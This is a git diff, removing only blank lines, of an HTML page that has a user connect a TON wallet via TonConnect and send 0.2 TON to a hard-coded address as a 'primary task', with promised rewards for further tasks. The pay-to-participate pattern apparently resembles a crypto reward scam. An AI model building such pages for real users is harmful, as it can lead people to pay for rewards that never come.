@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect Tonkeeper Wallet</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
     <style>
         body {
             margin: 0;
@@ -96,7 +95,6 @@
     </style>
 </head>
 <body>
-
     <div class="container">
         <h1>Tasks to participate</h1>
         <div id="ton-connect"></div>
@@ -105,7 +103,6 @@
         <div id="payment-btn-container" style="display:none; margin-top:30px;">
             <button class="ton-btn" onclick="sendTonTransaction()">Send 0.2 TON</button>
         </div>
-
         <div id="success-message" class="success-message">Primary task complete!<br> Now complete optional tasks to increase rewards.</div>
         
         <!-- Optional Tasks Section -->
@@ -117,15 +114,12 @@
             <!-- <a href="https://yourwebsite.com/newsletter" target="_blank">🔹 Subscribe to our Newsletter</a> -->
         </div>
     </div>
-
 <script>
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://shreyshah173.github.io/TonPlatformTemp/tonconnect-manifest.json',
         buttonRootId: 'ton-connect'
     });
-
     let userAddress = null;
-
     // Listen for wallet connection
     tonConnectUI.onStatusChange((wallet) => {
         if (wallet) {
@@ -135,12 +129,10 @@
             document.getElementById('payment-btn-container').style.display = 'none';
         }
     });
-
     // Send TON Transaction
     function sendTonTransaction() {
         const recipient = 'UQAgcDbv-QGy0hekhQh906ulLhGxLeXkzzOraL0FlmNg9aQ2';
         const amount = 0.2 * 10**9;  // 0.2 TON in nanotons
-
         if (userAddress) {
             tonConnectUI.sendTransaction({
                 validUntil: Math.floor(Date.now() / 1000) + 300,
@@ -157,7 +149,6 @@
                 setTimeout(() => {
                     window.location.href = 'thank-you.html'; // Redirect to the thank-you page
                 }, 2000); // Delay redirect by 2 seconds for a smoother experience
-
                 // document.getElementById('optional-tasks').style.display = 'block';
             }).catch((error) => {
                 console.error('Transaction failed:', error);
@@ -165,6 +156,5 @@
         }
     }
 </script>
-
 </body>
 </html>
